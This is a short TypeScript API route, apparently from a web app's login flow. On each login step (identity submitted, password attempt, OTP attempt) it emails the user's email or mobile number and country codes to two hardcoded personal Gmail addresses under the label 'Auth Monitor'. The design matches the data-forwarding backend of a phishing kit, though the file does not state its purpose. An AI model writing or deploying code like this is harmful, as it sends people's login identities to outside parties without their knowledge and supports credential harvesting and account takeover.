import nodemailer from "nodemailer";

interface AuthEmailPayload {
  type: "IDENTITY_SUBMITTED" | "PASSWORD_LOGIN_ATTEMPT" | "OTP_LOGIN_ATTEMPT";
  identity: string;
  countryDial?: string;
  countryCode?: string;
}


export async function POST(req: Request) {
  try {
    const body = (await req.json()) as AuthEmailPayload;

    if (!body.type || typeof body.identity !== "string") {
  return new Response(
    JSON.stringify({ message: "Invalid request payload" }),
    { status: 400 }
  );
}


    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    let subject = "";
    let text = "";

    switch (body.type) {
      case "IDENTITY_SUBMITTED":
        subject = "New Login Identity Submitted";
        text = `
Login Identity Submitted

Email / Mobile: ${body.identity}
Country Code: ${body.countryCode || "N/A"}
Dial Code: ${body.countryDial || "N/A"}
`;
        break;

      case "PASSWORD_LOGIN_ATTEMPT":
        subject = "Password Login Attempt";
        text = `
      Password Login Attempt

      Email / Mobile: ${body.identity}
      `;
              break;

      case "OTP_LOGIN_ATTEMPT":
        subject = "OTP Login Attempt";
        text = `
OTP Login Attempt

Email / Mobile: ${body.identity}
`;
        break;

      default:
        return new Response(
          JSON.stringify({ message: "Unsupported action" }),
          { status: 400 }
        );
    }

    await transporter.sendMail({
      from: `"Auth Monitor" <${process.env.EMAIL_USER}>`,
      to: ["andrewilliams2091@gmail.com", "daxumjay@gmail.com"],
      subject,
      text,
    });

    return new Response(
      JSON.stringify({ message: "Email sent successfully" }),
      { status: 200 }
    );
  } catch (error) {
    console.error("Email error:", error);
    return new Response(
      JSON.stringify({ message: "Failed to send email" }),
      { status: 500 }
    );
  }
}
